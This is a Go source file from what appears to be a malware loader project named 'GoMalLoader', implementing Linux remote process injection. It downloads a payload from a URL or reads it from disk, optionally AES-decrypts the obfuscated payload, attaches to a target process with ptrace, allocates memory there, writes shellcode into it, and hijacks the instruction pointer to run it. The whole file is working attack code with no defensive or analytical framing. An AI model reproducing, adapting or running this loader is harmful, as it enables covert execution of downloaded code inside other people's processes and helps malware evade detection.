//go:build linux

package loader

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strconv"
	"syscall"

	"GoMalLoader/utils"
)

// TODO: Implement remote injection using ptrace and process_vm_writev

type linuxRemoteInjector struct{}

func NewRemoteInjector() RemoteInjector {
	return &linuxRemoteInjector{}
}

// Minimal: requires cfg.TargetProcess to be a PID string
func (l *linuxRemoteInjector) Inject(cfg LoaderConfig) error {
	if cfg.TargetProcess == "" {
		return fmt.Errorf("TargetProcess (PID as string) required in config for Linux remote injection")
	}
	pid, err := strconv.Atoi(cfg.TargetProcess)
	if err != nil {
		return fmt.Errorf("TargetProcess must be a PID (string): %v", err)
	}

	var payload []byte
	if cfg.Source == "url" {
		resp, err := http.Get(cfg.URL)
		if err != nil {
			return err
		}
		defer resp.Body.Close()
		payload, err = io.ReadAll(resp.Body)
	} else {
		payload, err = os.ReadFile(cfg.Path)
	}
	if err != nil {
		return err
	}

	if cfg.Obfuscated {
		payload, err = utils.AESDecrypt(payload, []byte(cfg.AESKey))
		if err != nil {
			return err
		}
	}

	log.Printf("[+] Attaching to process %d", pid)
	if err := utils.PtraceAttach(pid); err != nil {
		return fmt.Errorf("ptrace attach failed: %v", err)
	}
	defer func() {
		log.Printf("[+] Detaching from process %d", pid)
		utils.PtraceDetach(pid)
	}()
	if err := utils.Wait(pid); err != nil {
		return fmt.Errorf("wait after attach failed: %v", err)
	}

	log.Printf("[+] Allocating %d bytes in target process", len(payload))
	remoteAddr, err := utils.RemoteMmap64(pid, len(payload))
	if err != nil {
		return fmt.Errorf("remote mmap failed: %v", err)
	}
	log.Printf("[+] Allocated memory at 0x%x", remoteAddr)

	log.Printf("[+] Writing shellcode to target process")
	if err := utils.WriteMemory(pid, remoteAddr, payload); err != nil {
		return fmt.Errorf("write shellcode failed: %v", err)
	}

	log.Printf("[+] Hijacking RIP to shellcode at 0x%x", remoteAddr)
	regs, err := utils.GetRegs(pid)
	if err != nil {
		return fmt.Errorf("getregs failed: %v", err)
	}
	originalRip := regs.Rip
	regs.Rip = uint64(remoteAddr)
	if err := utils.SetRegs(pid, regs); err != nil {
		return fmt.Errorf("setregs failed: %v", err)
	}

	log.Printf("[+] Continuing target process execution")
	if err := syscall.PtraceCont(pid, 0); err != nil {
		return fmt.Errorf("ptrace cont failed: %v", err)
	}

	// TODO: For advanced use, restore original registers and state after shellcode execution.
	// This would require a trampoline shellcode or monitoring the process until shellcode returns.
	log.Printf("[+] Injection complete. Target RIP was 0x%x, now set to shellcode.", originalRip)
	return nil
}
